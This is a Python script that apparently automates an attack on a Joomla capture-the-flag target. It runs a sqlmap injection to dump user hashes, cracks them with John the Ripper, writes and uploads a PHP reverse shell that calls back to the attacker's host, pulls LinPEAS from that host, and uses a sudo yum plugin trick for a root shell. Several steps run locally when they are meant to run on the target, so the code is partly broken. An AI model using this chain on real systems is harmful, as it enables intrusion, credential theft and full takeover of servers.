import subprocess
import time
import os

TARGET_IP = "<target-ip>"  # Change this to the target IP address
LHOST = "<your-ip>"  # Your attacker's IP address
LPORT = "1234"  # Port for reverse shell
LINPEAS_PATH = "./linpeas.sh"  # Path to LinPEAS on your local machine

# Function to execute shell commands
def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode(), error.decode()

# 1. Directory Enumeration with Dirsearch
def dirsearch_enum():
    print("[*] Running Dirsearch...")
    dirsearch_cmd = f"dirsearch -u http://{TARGET_IP} -E -r -t 100"
    output, error = run_command(dirsearch_cmd)
    print(output)

# 2. Joomla Version Detection with Metasploit
def joomla_version():
    print("[*] Running Joomla version detection in Metasploit...")
    metasploit_cmd = f"""
    msfconsole -q -x 'use auxiliary/http/joomla_version; set RHOSTS {TARGET_IP}; run; exit'
    """
    output, error = run_command(metasploit_cmd)
    print(output)

# 3. SQL Injection with SQLMap
def sql_injection():
    print("[*] Running SQL Injection via SQLMap...")
    sqlmap_cmd = f"""
    sqlmap -u "http://{TARGET_IP}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
    --risk=3 --level=5 --random-agent --dbs -p list[fullordering] \
    -D joomla -T "#__users" -C username,password --dump
    """
    output, error = run_command(sqlmap_cmd)
    print(output)
    return output  # To parse Joomla credentials

# 4. Crack Passwords with John the Ripper
def crack_passwords(hash_file):
    print("[*] Cracking passwords with John the Ripper...")
    john_cmd = f"john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}"
    output, error = run_command(john_cmd)
    print(output)
    john_show_cmd = f"john --show {hash_file}"
    output, error = run_command(john_show_cmd)
    print(output)

# 5. Upload PHP Reverse Shell
def upload_reverse_shell():
    print("[*] Uploading PHP reverse shell...")
    # Create a simple PHP reverse shell
    php_reverse_shell = """
    <?php
    $sock=fsockopen("{LHOST}", {LPORT});
    $proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    ?>
    """.format(LHOST=LHOST, LPORT=LPORT)

    # Save the reverse shell to a file
    with open("reverse_shell.php", "w") as shell_file:
        shell_file.write(php_reverse_shell)

    # Upload the shell (replace this with the method that fits your target, e.g., file upload via Joomla or direct PUT request)
    upload_cmd = f"""
    curl -X POST -F 'file=@reverse_shell.php' http://{TARGET_IP}/path_to_upload  # Replace with the exact upload URL
    """
    output, error = run_command(upload_cmd)
    print(output)

# 6. Set up Reverse Shell Listener with Netcat
def start_nc_listener():
    print("[*] Starting Netcat listener...")
    nc_cmd = f"rlwrap nc -lvnp {LPORT}"
    subprocess.Popen(nc_cmd, shell=True)

# 7. Capture User Flag
def capture_user_flag():
    print("[*] Capturing user flag...")
    user_flag_cmd = "cat /home/jjameson/user.txt"
    output, error = run_command(user_flag_cmd)
    if output:
        print(f"[*] User Flag: {output.strip()}")
    else:
        print(f"[!] Error reading user flag: {error}")

# 8. Check for LinPEAS and Upload to Target
def check_and_upload_linpeas():
    # Check if LinPEAS is present locally
    if not os.path.isfile(LINPEAS_PATH):
        print(f"[!] LinPEAS not found at {LINPEAS_PATH}, downloading...")
        linpeas_download_cmd = f"wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O {LINPEAS_PATH}"
        output, error = run_command(linpeas_download_cmd)
        if error:
            print(f"[!] Error downloading LinPEAS: {error}")
            return
        else:
            print("[*] LinPEAS downloaded successfully.")

    print("[*] Uploading LinPEAS to target...")
    upload_linpeas_cmd = f"""
    cd /dev/shm; wget http://{LHOST}:{LPORT}/linpeas.sh;
    chmod +x linpeas.sh; ./linpeas.sh
    """
    output, error = run_command(upload_linpeas_cmd)
    print(output)

# 9. Capture Root Flag
def capture_root_flag():
    print("[*] Capturing root flag...")
    root_flag_cmd = "cat /root/root.txt"
    output, error = run_command(root_flag_cmd)
    if output:
        print(f"[*] Root Flag: {output.strip()}")
    else:
        print(f"[!] Error reading root flag: {error}")

# 10. GTFOBins Exploit
def gtfobins_exploit():
    print("[*] Running GTFOBins yum exploit for root...")
    gtfobins_cmd = f"""
   TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
    """
    output, error = run_command(gtfobins_cmd)
    print(output)

# Main function to automate the box
def main():
    dirsearch_enum()
    
    joomla_version()

    sql_injection()

    # Pause for password dump and cracking
    print("[!] Check if SQLMap dumped hashes. Manually save them as 'hashes.txt'.")
    crack_passwords("hashes.txt")

    # Start the reverse shell listener in background
    start_nc_listener()

    # Upload reverse shell
    upload_reverse_shell()

    # After getting reverse shell, capture user flag
    time.sleep(10)  # Wait for shell connection
    capture_user_flag()

    # Upload and run LinPEAS if available
    check_and_upload_linpeas()

    # Capture the root flag
    capture_root_flag()

    # Exploit with GTFOBins if necessary
    gtfobins_exploit()

if __name__ == "__main__":
    main()
